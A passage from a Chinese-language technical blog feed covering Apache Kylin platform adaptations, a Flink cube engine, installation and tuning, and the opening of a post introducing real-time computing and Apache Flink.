平台，新增用户时会填写企业微信名、用户角色以及是否激活用户。当用户登录系统时，会自动检测用户账号以及该账号是否在平台内注册，如果没有注册则无权限，反之自动登录系统。 </p><h3 id="内部Hive兼容"><a href="#内部Hive兼容" class="headerlink" title="内部Hive兼容"></a>内部Hive兼容</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92bzc39h9j20g60ajmxc.jpg" alt="undefined"></p><p>由于历史原因，我们部门内的 Hive 版本（THive）与 Kylin 不兼容，这就导致 Kylin 无法正常访问 Kylin 集群，所以我们采用了上图所示的兼容方案。首先，我们使用社区 Hive 版本搭建一个全新的 Hive，并作为 Kylin 的默认 Hive；其次，当 kylin 加载源表时，我们是通过内部的 UPS 系统读取 THive 的元数据信息；最后，在 Load 源表到 Kylin 时，我们根据表的元数据信息在 Kylin 的 Hive 上创建一张相同的表，但该表的存储路径依旧指向 THive 的路径，而用户在构建 cube 时，则访问新创建的表，至此就解决了 Kylin 访问 THive 的问题。 </p><h3 id="计算资源可配置化"><a href="#计算资源可配置化" class="headerlink" title="计算资源可配置化"></a>计算资源可配置化</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92bzqjxlmj20sg0b00td.jpg" alt="undefined"></p><p> 目前，Kylin 配置计算资源信息有两种方式：一是在 Kylin 配置文件中配置一个全局的计算集群及队列；二是在创建工程或者 Cube 时，在扩展参数中指定集群配置。这两种配置方式在灵活性及便捷性方面都比较差，而在我们内部是有接口可以获取到某一个用户有计算资源的计算集群及计算队列的，所以，在创建工程或者 Cube 时，我们使用了下拉框选择式的方式，让用户选择提交任务的计算资源及队列，从而大大简化了用户的使用流程。 </p><h3 id="通知机制"><a href="#通知机制" class="headerlink" title="通知机制"></a>通知机制</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92c01zg2dj20sg0cijs8.jpg" alt="undefined"></p><p>Kylin 只提供了发邮件通知的功能，而作为目前使用最广泛的工具，微信、企业微信在实时性及便捷性方面都远远胜于邮件，所以，我们提供了邮件、微信、企业微信三种方式，供用户选择。 </p><h3 id="定时调度"><a href="#定时调度" class="headerlink" title="定时调度"></a>定时调度</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92c0ds7dij20sg0augmf.jpg" alt="undefined"></p><p>Kylin 系统自身并没有提供定时调度功能，但基本上每家公司都有自己的统一调度平台，我们也不例外。我们通过 Kylin 提供的API接口，将 Cube 定时构建的功能作为一个插件集成到了公司内部的统一调度平台上。 </p><h3 id="业务接入"><a href="#业务接入" class="headerlink" title="业务接入"></a>业务接入</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92c0z1koyj20sg0bjjs2.jpg" alt="undefined"></p><p>做完以上平台化改造后，Kylin 平台基本具备了接入不同类型业务的能力，用户申请接入流程如上图所示。</p><p>业务使用情况：</p><p>我们团队是在今年初才开始引入 Kylin，目前已经在使用的业务主要有 QQ 音乐、腾讯视频、广点通、财付通等，Cube 的数量有 10 个，单份数据存储总量是 5 T，数据规模在 30 亿条左右。</p><h3 id="Flink-Cube-Engion："><a href="#Flink-Cube-Engion：" class="headerlink" title="Flink Cube Engion："></a>Flink Cube Engion：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">目前，Kylin 已经支持使用 MapReduce 和 Spark 作为构建引擎，而作为目前比较火的流批一体的大数据计算引擎怎能缺席？所以我使用 Flink 开发了一个高性能的构建引擎：Flink Cube Engine。</span><br><span class="line"></span><br><span class="line">Flink Cube Engine 是腾讯基于 Kylin 插件化的 Cube Engine 架构开发的一个高性能构建引擎，目前已具备了上线使用的能力，感兴趣的同学可以体验一下，目前该引擎已经在腾讯生产环境上线 1 个月+，非常稳定而且效果不错。</span><br><span class="line"></span><br><span class="line">Umbrella issue: </span><br><span class="line"></span><br><span class="line">Umbrella issue: </span><br><span class="line"></span><br><span class="line">https://issues.apache.org/jira/browse/KYLIN-3758</span><br><span class="line"></span><br><span class="line">分支：</span><br><span class="line"></span><br><span class="line">https://github.com/apache/kylin/tree/engine-flink</span><br></pre></td></tr></table></figure><p>上面</p><p>第一个链接可以看到flink cube的完成情况</p><p>第二个链接可以看到flink cube在github的代码</p><p>使用：<img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92cvbklxij20sg0bf0t6.jpg" alt="undefined"></p><p>Kylin 的一次 Cube 构建任务，包含了很多个子任务，而最重要的莫过于 Cube 构建这一步骤，所以，我们在 build 和 merge Cube 这两种任务中，优先实现了Cube 构建这一步骤，其他计算步骤依旧通过使用 MapReduce 来实现。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92cwad8r9j20m50f1aaq.jpg" alt="undefined"></p><p>选择使用 Flink Cube Engine 的方式也和选择 Map Reduce 和 Spark 任务类似，我们提供了前台可视化的界面，供用户选择。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92cwti90pj20sg0bygmq.jpg" alt="undefined"></p><p>上图是我们内部业务上线 Flink Cube Engine 之后的性能对比，从图中可见，该步骤的构建耗时从 49 分钟降到了 13 分钟，优化效果比较明显。两种情况的资源配置如下：</p><p>Flink 配置为：</p><p>-ytm 4G -yjm 2G -ys 1 -p 100 -yn 100</p><p>Spark 采用的动态分配资源如下：</p><p>kylin.engine.spark-conf.spark.dynamicAllocation.enabled=true</p><p>kylin.engine.spark-conf.spark.dynamicAllocation.minExecutors=2</p><p>kylin.engine.spark-conf.spark.dynamicAllocation.maxExecutors=1000</p><p>kylin.engine.spark-conf.spark.dynamicAllocation.executorIdleTimeout=300</p><p>kylin.engine.spark-conf.spark.shuffle.service.enabled=true</p><p>kylin.engine.spark-conf.spark.shuffle.service.port=7337</p><p>虽然，Spark 采用的是动态分配资源，但在任务执行过程中，我们观察到 Spark实际分配的资源远比 Flink 要多的多。</p><p>那为什么性能提升会那么明显呢？</p><ol start="4"><li>Flink Cube Engine 的优化</li></ol><p>性能的提升，无非有两方面的原因，一是参数的优化，二是代码的优化。</p><p>1) 调参</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92d1xm7dbj20sg04qt9j.jpg" alt="undefined"></p><p>影响 Flink 任务性能主要有几个核心参数：并行度、单个 TM slot 数目、TM container 数目，其中单个 TM container 数目=并行度/单个 TM slot 数目。</p><p>我们调优的过程采用了控制变量法，即：固定并行度不变、固定 Job 总内存数不变。通过不断的调整单个 TM 的 slot 数目，我们发现如果单个 TM 的 slot 数目减少，拉起更多的 TM container 性能会更好。</p><p>此外，我们还使用了对象复用、内存预分配等方法，发现没有对性能提升起到太大的效果。</p><p>2) 代码优化(合并计算)</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92d2ii64cj20sg0bimyh.jpg" alt="undefined"></p><p> 在实现 Flink Cube Engine 的时候，一开始我们使用了 Map/Reduce 两个算子，发现性能很差，比 Spark 的性能还要差很多，后来我们通过调整使用了 Flink 的 mapPartition/reduceGroup 两个算子，性能就有了明显的提升。 </p><p>Flink Cube Engine 下一步的计划：</p><ol><li>全链路 Flink</li></ol><p>如上所述，目前 Cube 构建过程中，只有最关键的 cube 构建这一子任务使用了 Flink，而其他子任务仍然使用的是 MapReduce，我们下一步会继续完善 Flink Cube Engine，将所有的子任务都使用 Flink 来构建。</p><ol start="2"><li>Flink 升级到 1.9</li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92d55mrpgj20sg09bdgg.jpg" alt="undefined"></p><p>Flink 最近发布了 1.9.0，该版本包含了很多重要特性且性能也有了一定提升，所以，我们会把 Flink Cube Engine 使用的 Flink 版本升级到1.9.0。 </p><h2 id="第六章-Kylin实操"><a href="#第六章-Kylin实操" class="headerlink" title="第六章 Kylin实操"></a>第六章 Kylin实操</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Kylin的安装相对简单，我们使用的Kylin是2.6.3版本的，安装并没有多少复杂的步骤，按照官网的步骤安装即可：</p><p><a href="http://kylin.apache.org/docs/install/index.html" target="_blank" rel="noopener">官方文档安装步骤</a></p><p>安装完成后，在bin目录下面执行check-env.sh，这个脚本会执行检查，如果仅仅显示KYLIN_HOME is set to… 说明一切配置正常，就可以启动了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>回到Kylin的bin目录下执行sample.sh，成功执行后会有如下提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Retrieving hadoop conf dir...</span><br><span class="line">KYLIN_HOME is set to /data1/CM/kylin-2.6.3</span><br></pre></td></tr></table></figure><p>出现这个提示，就说明已经成功了。</p><p>根据日志提示信息，重新加载元数据，使kylin能读取到创建好的project “learn_kylin”.跳转至system ,点击reload metadata</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g94igifi2xj20zk0gxtc3.jpg" alt="undefined"></p><p> 然后buil cube</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g94ih39tw6j20zk0gxq4q.jpg" alt="undefined"></p><p>此时cube正在创建，可以在Monitor中监控到整个cube构造的过程以及可以查看到每一步构建的过程和日志。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g94ihodonej20zk0gx0un.jpg" alt="undefined"></p><p>然后就可以在SQL输入框输入相关的SQL，就可以做简单的可视化。</p><h2 id="第七章-Kylin的优化"><a href="#第七章-Kylin的优化" class="headerlink" title="第七章 Kylin的优化"></a>第七章 Kylin的优化</h2><h3 id="查询时间优化"><a href="#查询时间优化" class="headerlink" title="查询时间优化"></a>查询时间优化</h3><p>Kylin 的查询过程主要包含四个步骤：解析 SQL，从 HBase 获取数据，二次聚合运算，返回结果。显然优化的重点就落在如何加快 HBase 获取数据的速度和减少二次聚合预算。</p><ul><li>提高 HBase 响应时间：修改配置，修改 Cache 的策略，增加 Block Cache 的容量</li><li>减少二次聚合运算：合理设计纬度，使查询时尽量能精确命中 Cuboid。去重值使用有损算法。</li></ul><h3 id="预计算优化"><a href="#预计算优化" class="headerlink" title="预计算优化"></a>预计算优化</h3><p>预计算的优化，主要考虑有何缩短构建花费的时间，以及中间结果和最终结果占用的空间。每个业务单独一个 Cube，避免每个 Cube 大而全，减少不必要的计算。</p><h4 id="Cube优化"><a href="#Cube优化" class="headerlink" title="Cube优化"></a>Cube优化</h4><p>随着维度数目的增加，Cuboid 的数量成指数级增长。为了缓解 Cube 的构建压力，Kylin 提供了 Cube 的高级设置。这些高级设置包括聚合组（Aggregation Group）、联合维度（Joint Dimension）、层级维度（Hierarchy Dimension）和必要维度（Mandatory Dimension）等。</p><p>合理调整纬度配置，对需构建的 Cuboid 进行剪枝，刷选出真正需要的 Cuboid，优化构建性能，降低构建时间，大大提高了集群资源的利用效率。</p><p>如果Cube优化的好，效果可以非常明显。</p><h5 id="优化方法："><a href="#优化方法：" class="headerlink" title="优化方法："></a>优化方法：</h5><p>1.必须维度</p><p>查询时，经常使用的维度，以及低基数纬度。如该维度基数&lt;10，可以考虑作为必须维度。 </p><p>2.层级维度</p><p> 维度关系有一定层级性、基数有小到大情况可以使用层级维度。 </p><p>3.Joint维度</p><p>维度之间是同时出现的关系，及查询时，绝大部分情况都是同时出现的。可以使用 joint 维。 </p><p>4.维度组合组</p><p>将为维度进行分组，查询时组与组之间的维度不会同时出现。 </p><h5 id="配置优化："><a href="#配置优化：" class="headerlink" title="配置优化："></a>配置优化：</h5><p> 配置优化，包括 Kylin 资源的配置以及 Hadoop 集群配置相关修改。 </p><ol><li>构建资源</li></ol><p>每个 Cube 构建时，所需的资源不太一样，需要进行相应的资源调整。</p><ol start="2"><li>调整副本</li></ol><p>集群默认的文件副本数为 3，Cube 构建时，将副本数调为 2，个别中间任务还可以调整为 1，这样可以降低构建任务时集群 IO。为了保证查询的稳定性，HBase 副本数依然为 3。</p><ol start="3"><li>压缩格式</li></ol><p>在实验中发现，如果Hive和Hbase都设置了snappy格式，那么集群IO交互会小很多。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>Kylin在复杂业务的查询中可以用预计算的方式提前计算好预期结果存在Hive临时表中，然后写入Hbase，优点显而易见：</p><p>1.可以合理配置集群资源，预计算的时间可以提前设定。</p><p>2.对海量数据的提前预计算意味着用户查询时不用重复计算，直接从Hbase中获取结果即可。</p><p>缺点：</p><p>Kylin仅支持星型模型的数据集，对原数据提出了要求。</p><p>并且作为空间换时间的OLAP应用，需要占用HBase集群大量的空间。</p><p>维度的膨胀需要结合业务控制，不同的业务还需要研究不同Cube的优化，使用成本会比IMPALA 这种使用SQL语言的高不少。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Kylin是在Hadoop上的SQL层，最近对Phoenix调研完成之后，对Kylin产生了兴趣。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2ly1g8v1qog93xj209d08laa6.jpg&quot; alt=&quot;undefined&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Apache" scheme="http://yoursite.com/categories/Apache/"/>
    
      <category term="Kylin" scheme="http://yoursite.com/categories/Apache/Kylin/"/>
    
    
      <category term="Kylin" scheme="http://yoursite.com/tags/Kylin/"/>
    
  </entry>
  
  <entry>
    <title>大数据实时计算引擎 Flink 实战与性能优化</title>
    <link href="http://yoursite.com/2019/11/07/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E8%AE%A1%E7%AE%97%E5%BC%95%E6%93%8E%20Flink%20%E5%AE%9E%E6%88%98%E4%B8%8E%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <id>http://yoursite.com/2019/11/07/大数据实时计算引擎 Flink 实战与性能优化/</id>
    <published>2019-11-07T09:07:24.328Z</published>
    <updated>2019-11-25T01:29:51.523Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大数据实时计算引擎-Flink-实战与性能优化"><a href="#大数据实时计算引擎-Flink-实战与性能优化" class="headerlink" title="大数据实时计算引擎 Flink 实战与性能优化"></a>大数据实时计算引擎 Flink 实战与性能优化</h1><blockquote><p>Flink作为流处理方案的最佳选择，还有流处理 批处理大一统之势，可谓必知必会</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9a0z5j7i6j20bp04tdgk.jpg" alt="undefined"></p><a id="more"></a> <h2 id="一、公司到底需不需要引入实时计算引擎？"><a href="#一、公司到底需不需要引入实时计算引擎？" class="headerlink" title="一、公司到底需不需要引入实时计算引擎？"></a>一、公司到底需不需要引入实时计算引擎？</h2><h3 id="实时计算需求"><a href="#实时计算需求" class="headerlink" title="实时计算需求"></a>实时计算需求</h3><p>大数据发展至今，数据呈指数倍的增长，对实效性的要求也越来越高，所以你可能接触到下面这类需求会越来越多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">小田，你看能不能做个监控大屏实时查看促销活动销售额（GMV）？</span><br><span class="line"></span><br><span class="line">小朱，搞促销活动的时候能不能实时统计下网站的 PV/UV 啊？</span><br><span class="line"></span><br><span class="line">小鹏，我们现在搞促销活动能不能实时统计销量 Top5 啊？</span><br><span class="line"></span><br><span class="line">小李，怎么回事啊？现在搞促销活动结果服务器宕机了都没告警，能不能加一个？</span><br><span class="line"></span><br><span class="line">小刘，服务器这会好卡，是不是出了什么问题啊，你看能不能做个监控大屏实时查看机器的运行情况？</span><br><span class="line"></span><br><span class="line">小赵，我们线上的应用频繁出现 Error 日志，但是只有靠人肉上机器查看才知道情况，能不能在出现错误的时候及时告警通知？</span><br><span class="line"></span><br><span class="line">小夏，我们 1 元秒杀促销活动中有件商品被某个用户薅了 100 件，怎么都没有风控啊？</span><br><span class="line"></span><br><span class="line">小宋，你看我们搞促销活动能不能根据每个顾客的浏览记录实时推荐不同的商品啊？</span><br><span class="line"></span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>那这些场景对应着什么业务需求呢？我们来总结下，大概如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plho80ksj20z50u042l.jpg" alt="undefined"></p><p>初看这些需求，是不是感觉很难？那么我们接下来来分析一下该怎么去实现？</p><p>从这些需求来看，最根本的业务都是需要<strong>实时查看数据信息</strong>，那么首先我们得想想如何去采集这些实时数据，然后将采集的实时数据进行实时的计算，最后将计算后的结果下发到第三方。</p><h3 id="数据实时采集"><a href="#数据实时采集" class="headerlink" title="数据实时采集"></a>数据实时采集</h3><p>就上面这些需求，我们需要采集些什么数据呢？</p><ol><li>买家搜索记录信息</li><li>买家浏览的商品信息</li><li>买家下单订单信息</li><li>网站的所有浏览记录</li><li>机器 CPU/MEM/IO 信息</li><li>应用日志信息</li></ol><h3 id="数据实时计算"><a href="#数据实时计算" class="headerlink" title="数据实时计算"></a>数据实时计算</h3><p>采集后的数据实时上报后，需要做实时的计算，那我们怎么实现计算呢？</p><ol><li>计算所有商品的总销售额</li><li>统计单个商品的销量，最后求 Top5</li><li>关联用户信息和浏览信息、下单信息</li><li>统计网站所有的请求 IP 并统计每个 IP 的请求数量</li><li>计算一分钟内机器 CPU/MEM/IO 的平均值、75 分位数值</li><li>过滤出 Error 级别的日志信息</li></ol><h3 id="数据实时下发"><a href="#数据实时下发" class="headerlink" title="数据实时下发"></a>数据实时下发</h3><p>实时计算后的数据，需要及时的下发到下游，这里说的下游代表可能是：</p><ol><li>告警方式（邮件、短信、钉钉、微信）</li></ol><p>在计算层会将计算结果与阈值进行比较，超过阈值触发告警，让运维提前收到通知，及时做好应对措施，减少故障的损失大小。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plhzw2umj210c0dsdh7.jpg" alt="undefined"></p><ol><li>存储（消息队列、DB、文件系统等）</li></ol><p>数据存储后，监控大盘（Dashboard）从存储（ElasticSearch、HBase 等）里面查询对应指标的数据就可以查看实时的监控信息，做到对促销活动的商品销量、销售额，机器 CPU、MEM 等有实时监控，运营、运维、开发、领导都可以实时查看并作出对应的措施。</p><ul><li>让运营知道哪些商品是爆款，哪些店铺成交额最多，哪些商品成交额最高，哪些商品浏览量最多；</li></ul><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pli7o9s7j20gm12540a.jpg" alt="undefined"></p><ul><li>让运维可以时刻了解机器的运行状况，出现宕机或者其他不稳定情况可以及时处理；</li></ul><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plijpowcj214o0u0jv0.jpg" alt="undefined"></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plio676aj21em0u0gqt.jpg" alt="undefined"></p><ul><li>让开发知道自己项目运行的情况，从 Error 日志知道出现了哪些 Bug；</li></ul><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pliw2d21j217f0u0tdh.jpg" alt="undefined"></p><ul><li>让领导知道这次促销赚了多少 money。</li></ul><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plj8y8wdj20p00goacz.jpg" alt="undefined"></p><p><strong>从数据采集到数据计算再到数据下发，整个流程在上面的场景对实时性要求还是很高的，任何一个地方出现问题都将影响最后的效果！</strong></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pljh92jpj216l0u00wg.jpg" alt="undefined"></p><h3 id="实时计算场景"><a href="#实时计算场景" class="headerlink" title="实时计算场景"></a>实时计算场景</h3><p>前面说了这么多场景，这里我们总结一下实时计算常用的场景有哪些呢？</p><ol><li>交通信号灯数据</li><li>道路上车流量统计（拥堵状况）</li><li>公安视频监控</li><li>服务器运行状态监控</li><li>金融证券公司实时跟踪股市波动，计算风险价值</li><li>数据实时 ETL</li><li>银行或者支付公司涉及金融盗窃的预警</li></ol><p>……</p><p>另外自己还做过调研，实时计算框架的使用场景有如下这些：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plkbpo1mj20u00ymq6n.jpg" alt="undefined"></p><p>总结一下大概有下面这四类：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plkidal4j21as0ps0va.jpg" alt="undefined"></p><ol><li>实时数据存储</li></ol><p>实时数据存储的时候做一些微聚合、过滤某些字段、数据脱敏，组建数据仓库，实时 ETL。</p><ol start="2"><li>实时数据分析</li></ol><p>实时数据接入机器学习框架（TensorFlow）或者一些算法进行数据建模、分析，然后动态的给出商品推荐、广告推荐</p><ol start="3"><li>实时监控告警</li></ol><p>金融相关涉及交易、实时风控、车流量预警、服务器监控告警、应用日志告警</p><ol start="4"><li>实时数据报表</li></ol><p>活动营销时销售额/销售量大屏，TopN 商品</p><p>说到实时计算，这里不得不讲一下和传统的离线计算的区别！</p><h3 id="离线计算-vs-实时计算"><a href="#离线计算-vs-实时计算" class="headerlink" title="离线计算 vs 实时计算"></a>离线计算 vs 实时计算</h3><p>再讲这两个区别之前，我们先来看看流处理和批处理的区别：</p><h4 id="流处理与批处理"><a href="#流处理与批处理" class="headerlink" title="流处理与批处理"></a>流处理与批处理</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pllqzkewj219e0q0gnf.jpg" alt="undefined"></p><p>看完流处理与批处理这两者的区别之后，我们来抽象一下前面文章的场景需求（<strong>实时计算</strong>）：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plm1lerpj219s0e6759.jpg" alt="undefined"></p><p>实时计算需要不断的从 MQ 中读取采集的数据，然后处理计算后往 DB 里存储，在计算这层你无法感知到会有多少数据量过来、要做一些简单的操作（过滤、聚合等）、及时将数据下发。</p><p>相比传统的<strong>离线计算</strong>，它却是这样的：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plm92vsuj219m0fudgu.jpg" alt="undefined"></p><p>在计算这层，它从 DB（不限 MySQL，还有其他的存储介质）里面读取数据，该数据一般就是固定的（前一天、前一星期、前一个月），然后再做一些复杂的计算或者统计分析，最后生成可供直观查看的报表（dashboard）。</p><h4 id="离线计算的特点"><a href="#离线计算的特点" class="headerlink" title="离线计算的特点"></a>离线计算的特点</h4><ol><li>数据量大且时间周期长（一天、一星期、一个月、半年、一年）</li><li>在大量数据上进行复杂的批量运算</li><li>数据在计算之前已经固定，不再会发生变化</li><li>能够方便的查询批量计算的结果</li></ol><h4 id="实时计算的特点"><a href="#实时计算的特点" class="headerlink" title="实时计算的特点"></a>实时计算的特点</h4><p>在大数据中与离线计算对应的则是实时计算，那么实时计算有什么特点呢？由于应用场景的各不相同，所以这两种计算引擎接收数据的方式也不太一样：离线计算的数据是固定的（不再会发生变化），通常离线计算的任务都是定时的，如：每天晚上 0 点的时候定时计算前一天的数据，生成报表；然而实时计算的数据源却是流式的。</p><p>这里我不得不讲讲什么是流式数据呢？我的理解是比如你在淘宝上下单了某个商品或者点击浏览了某件商品，你就会发现你的页面立马就会给你推荐这种商品的广告和类似商品的店铺，这种就是属于实时数据处理然后作出相关推荐，这类数据需要不断的从你在网页上的点击动作中获取数据，之后进行实时分析然后给出推荐。</p><h4 id="流式数据的特点"><a href="#流式数据的特点" class="headerlink" title="流式数据的特点"></a>流式数据的特点</h4><ol><li>数据实时到达</li><li>数据到达次序独立，不受应用系统所控制</li><li>数据规模大且无法预知容量</li><li>原始数据一经处理，除非特意保存，否则不能被再次取出处理，或者再次提取数据代价昂贵</li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plmoolb2j219s0ts41e.jpg" alt="undefined"></p><h4 id="实时计算的优势"><a href="#实时计算的优势" class="headerlink" title="实时计算的优势"></a>实时计算的优势</h4><p><strong>实时计算一时爽，一直实时计算一直爽</strong>，对于持续生成最新数据的场景，采用流数据处理是非常有利的。例如，再监控服务器的一些运行指标的时候，能根据采集上来的实时数据进行判断，当超出一定阈值的时候发出警报，进行提醒作用。再如通过处理流数据生成简单的报告，如五分钟的窗口聚合数据平均值。复杂的事情还有在流数据中进行数据多维度关联、聚合、塞选，从而找到复杂事件中的根因。更为复杂的是做一些复杂的数据分析操作，如应用机器学习算法，然后根据算法处理后的数据结果提取出有效的信息，作出、给出不一样的推荐内容，让不同的人可以看见不同的网页（千人千面）。</p><h3 id="实时计算面临的挑战"><a href="#实时计算面临的挑战" class="headerlink" title="实时计算面临的挑战"></a>实时计算面临的挑战</h3><ol><li>数据处理唯一性（如何保证数据只处理一次？至少一次？最多一次？）</li><li>数据处理的及时性（采集的实时数据量太大的话可能会导致短时间内处理不过来，如何保证数据能够及时的处理，不出现数据堆积？）</li><li>数据处理层和存储层的可扩展性（如何根据采集的实时数据量的大小提供动态扩缩容？）</li><li>数据处理层和存储层的容错性（如何保证数据处理层和存储层高可用，出现故障时数据处理层和存储层服务依旧可用？）</li></ol><p>因为各种需求，也就造就了现在不断出现实时计算框架，在 1.2 节中将重磅介绍如今最火的实时计算框架 —— Flink，在 1.3 节中会对比介绍 Spark Streaming、Structured Streaming 和 Storm 之间的区别。</p><h3 id="小结与反思"><a href="#小结与反思" class="headerlink" title="小结与反思"></a>小结与反思</h3><p>本节从实时计算的需求作为切入点，然后分析该如何去完成这种实时计算的需求，从而得知整个过程包括数据采集、数据计算、数据存储等，接着总结了实时计算场景的类型。最后开始介绍离线计算与实时计算的区别，并提出了实时计算可能带来的挑战。你们公司有文中所讲的类似需求吗？你是怎么解决的呢？</p><hr><h2 id="二、彻底了解大数据实时计算框架-Flink"><a href="#二、彻底了解大数据实时计算框架-Flink" class="headerlink" title="二、彻底了解大数据实时计算框架 Flink"></a>二、彻底了解大数据实时计算框架 Flink</h2><p>在 1.1 节中讲解了日常开发常见的实时需求，然后分析了这些需求的实现方式，接着对比了实时计算和离线计算。随着这些年大数据的飞速发展，也出现了不少计算的框架（Hadoop、Storm、Spark、Flink）。在网上有人将大数据计算引擎的发展分为四个阶段。</p><ul><li>第一代：Hadoop 承载的 MapReduce</li><li>第二代：支持 DAG（有向无环图）框架的计算引擎 Tez 和 Oozie，主要还是批处理任务</li><li>第三代：支持 Job 内部的 DAG（有向无环图），以 Spark 为代表</li><li>第四代：大数据统一计算引擎，包括流处理、批处理、AI、Machine Learning、图计算等，以 Flink 为代表</li></ul><p>或许会有人不同意以上的分类，笔者觉得其实这并不重要的，重要的是体会各个框架的差异，以及更适合的场景。并进行理解，没有哪一个框架可以完美的支持所有的场景，也就不可能有任何一个框架能完全取代另一个。</p><p>本文将对 Flink 的整体架构和 Flink 的多种特性做个详细的介绍！在讲 Flink 之前的话，我们先来看看<strong>数据集类型</strong>和<strong>数据运算模型</strong>的种类。</p><h4 id="数据集类型"><a href="#数据集类型" class="headerlink" title="数据集类型"></a>数据集类型</h4><ul><li>无穷数据集：无穷的持续集成的数据集合</li><li>有界数据集：有限不会改变的数据集合</li></ul><p>那么那些常见的无穷数据集有哪些呢？</p><ul><li>用户与客户端的实时交互数据</li><li>应用实时产生的日志</li><li>金融市场的实时交易记录</li><li>…</li></ul><h4 id="数据运算模型"><a href="#数据运算模型" class="headerlink" title="数据运算模型"></a>数据运算模型</h4><ul><li>流式：只要数据一直在产生，计算就持续地进行</li><li>批处理：在预先定义的时间内运行计算，当计算完成时释放计算机资源</li></ul><p>那么我们再来看看 Flink 它是什么呢？</p><h3 id="Flink-是什么？"><a href="#Flink-是什么？" class="headerlink" title="Flink 是什么？"></a>Flink 是什么？</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plr0788dj214a0gy755.jpg" alt="undefined"></p><p>Flink 是一个针对流数据和批数据的分布式处理引擎，代码主要是由 Java 实现，部分代码是 Scala。它可以处理有界的批量数据集、也可以处理无界的实时数据集。对 Flink 而言，其所要处理的主要场景就是流数据，批数据只是流数据的一个极限特例而已，所以 Flink 也是一款真正的流批统一的计算引擎。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plr9ox1fj21gt0u0gp2.jpg" alt="undefined"></p><p>Flink 提供了 State、Checkpoint、Time、Window 等，它们为 Flink 提供了基石，本篇文章下面会稍作讲解，具体深度分析后面会有专门的文章来讲解。</p><h3 id="Flink-整体架构"><a href="#Flink-整体架构" class="headerlink" title="Flink 整体架构"></a>Flink 整体架构</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plrjlud5j20lp0cuabw.jpg" alt="undefined"></p><p>从下至上：</p><ol><li>部署：Flink 支持本地运行（IDE 中直接运行程序）、能在独立集群（Standalone 模式）或者在被 YARN、Mesos、K8s 管理的集群上运行，也能部署在云上。</li><li>运行：Flink 的核心是分布式流式数据引擎，意味着数据以一次一个事件的形式被处理。</li><li>API：DataStream、DataSet、Table、SQL API。</li><li>扩展库：Flink 还包括用于 CEP（复杂事件处理）、机器学习、图形处理等场景。</li></ol><h3 id="Flink-支持多种方式部署"><a href="#Flink-支持多种方式部署" class="headerlink" title="Flink 支持多种方式部署"></a>Flink 支持多种方式部署</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pls0gqd0j22vw17qn0l.jpg" alt="undefined"></p><p>作为一个计算引擎，如果要做的足够完善，除了它自身的各种特点要包含，还得支持各种生态圈，比如部署的情况，Flink 是支持以 